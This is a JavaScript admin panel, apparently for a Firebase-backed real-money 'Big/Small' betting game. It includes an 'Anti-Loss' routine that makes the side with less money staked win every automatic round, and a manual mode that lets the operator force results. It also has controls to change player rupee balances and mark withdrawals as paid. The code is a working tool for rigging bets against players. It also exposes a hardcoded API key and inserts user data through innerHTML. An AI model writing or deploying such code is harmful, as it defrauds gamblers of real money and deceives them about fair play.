// ==========================================
// ARMY SAHARAJ - COMPLETE COMMAND ENGINE
// ==========================================

// 1. Firebase Configuration (Direct Integration)
const firebaseConfig = {
    apiKey: "AIzaSyAh1s75e5uKhyAb0YtlK5zFw9fna9-UyHw",
    authDomain: "saharaj-paid.firebaseapp.com",
    databaseURL: "https://saharaj-paid-default-rtdb.firebaseio.com",
    projectId: "saharaj-paid",
    storageBucket: "saharaj-paid.firebasestorage.app",
    appId: "1:39526305282:android:e0562119c2e9a2612ea11b"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
const db = firebase.database();

// 2. Auto-Create Test ID (SAHARAJ-777) for Verification
const setupTestingId = () => {
    const testUID = "SAHARAJ-777";
    db.ref('users/SAHARAJ_777_TEST').set({
        uid: testUID,
        email: "admin@saharaj.com",
        balance: 10000,
        isBanned: false,
        createdAt: Date.now()
    });
};
setupTestingId();

// 3. Tab Switch Command
function switchTab(id, el) {
    document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
    document.querySelectorAll('.nav-box').forEach(b => b.classList.remove('active'));
    document.getElementById(id).classList.add('active');
    el.classList.add('active');
}

// 4. Force Mode Command (Big/Small/Auto)
function setMode(mode, target) {
    db.ref('admin_control').set({ mode: mode, target: target });
}

// 5. Game Timer & Anti-Loss Engine (Runs Every Second)
setInterval(() => {
    const now = new Date();
    const sec = now.getSeconds();
    const pId = `${now.getFullYear()}${(now.getMonth()+1).toString().padStart(2,'0')}${now.getDate().toString().padStart(2,'0')}${now.getHours().toString().padStart(2,'0')}${now.getMinutes().toString().padStart(2,'0')}`;
    
    // UI Update
    document.getElementById('admin-timer').innerText = `00:${(60-sec).toString().padStart(2, '0')}`;
    document.getElementById('current-period-id').innerText = pId;
    
    // Result Logic at 59th Second
    if (sec === 59) {
        db.ref('admin_control').once('value', adminSnap => {
            const adminData = adminSnap.val() || { mode: 'auto' };
            db.ref('live_bets').once('value', betSnap => {
                const bets = betSnap.val() || { Big: 0, Small: 0 };
                
                let winner;
                if (adminData.mode === 'manual') {
                    winner = adminData.target; // Force result based on your button click
                } else {
                    // Anti-Loss Logic: Target side with LESS money
                    winner = (parseFloat(bets.Big) > parseFloat(bets.Small)) ? 'Small' : 'Big';
                }
                
                // SAVE RESULT PERMANENTLY
                db.ref('game_history/' + pId).set({
                    period: pId,
                    result: winner,
                    timestamp: firebase.database.ServerValue.TIMESTAMP
                });
                
                // Reset Bets for next round
                db.ref('live_bets').set({ Big: 0, Small: 0 });
            });
        });
    }
}, 1000);

// 6. Balance Control: Add (+) and Deduct (-)
function adjBal(id, isAdd) {
    const amtInput = document.getElementById('amt-' + id);
    const amount = parseFloat(amtInput.value);
    
    if (!amount || amount <= 0) {
        alert("Please enter a valid amount!");
        return;
    }

    const ref = db.ref('users/' + id + '/balance');
    ref.once('value', s => {
        let currentBal = s.val() || 0;
        let finalBal = isAdd ? (currentBal + amount) : (currentBal - amount);
        
        if(finalBal < 0) finalBal = 0; // Negative balance security
        
        ref.set(finalBal).then(() => {
            alert(isAdd ? "Amount Added!" : "Amount Deducted!");
            amtInput.value = ""; // Clear input
        });
    });
}

// 7. Real-time UI Syncing

// Button Style Sync (Black Mode)
db.ref('admin_control').on('value', snap => {
    const d = snap.val() || { mode: 'auto' };
    const bBig = document.getElementById('btn-Big'), bSmall = document.getElementById('btn-Small'), bAuto = document.getElementById('btn-auto');
    if(!bBig) return;

    [bBig, bSmall, bAuto].forEach(b => b.classList.remove('active-mode'));
    if (d.mode === 'manual') {
        document.getElementById('btn-' + d.target).classList.add('active-mode');
    } else {
        bAuto.classList.add('active-mode');
    }
});

// Sync History Dots (Last 10 Results)
db.ref('game_history').limitToLast(10).on('value', snap => {
    const row = document.getElementById('history-line-row');
    row.innerHTML = "";
    let entries = [];
    snap.forEach(c => entries.push(c.val()));
    
    entries.reverse().forEach(h => {
        const resClass = h.result === 'Big' ? 'res-B' : 'res-S';
        row.innerHTML += `<div class="res-dot ${resClass}">${h.result[0]}</div>`;
    });
});

// Render User List with + and - Buttons
db.ref('users').on('value', s => {
    const list = document.getElementById('player-table');
    list.innerHTML = "";
    s.forEach(c => {
        const d = c.val(); const id = c.key;
        list.innerHTML += `
            <tr>
                <td>${d.uid}</td>
                <td>₹${d.balance}</td>
                <td>
                    <input type="number" id="amt-${id}" class="bal-input" placeholder="0">
                    <button onclick="adjBal('${id}', true)" class="btn-mini" style="background:#10b981; color:#fff;">+</button>
                    <button onclick="adjBal('${id}', false)" class="btn-mini" style="background:#ef4444; color:#fff;">-</button>
                </td>
            </tr>`;
    });
});

// Sync Live Bets Pool
db.ref('live_bets').on('value', s => {
    const d = s.val() || { Big: 0, Small: 0 };
    document.getElementById('big-total').innerText = d.Big || 0;
    document.getElementById('small-total').innerText = d.Small || 0;
});

// Payment Success Command
function approveWithdrawal(key) {
    db.ref('withdraw_requests/' + key).update({ status: 'Success' })
    .then(() => alert("Withdrawal marked as SUCCESS"));
}

// User Registration Command
function registerUser() {
    const e = document.getElementById('c-email').value, p = document.getElementById('c-pass').value, u = document.getElementById('c-uid').value;
    if(!e || !p || !u) return alert("Fill all fields");
    firebase.auth().createUserWithEmailAndPassword(e, p).then(cred => {
        db.ref('users/' + cred.user.uid).set({ email: e, uid: u, balance: 0, isBanned: false });
        alert("Official ID Created!");
    }).catch(err => alert(err.message));
}
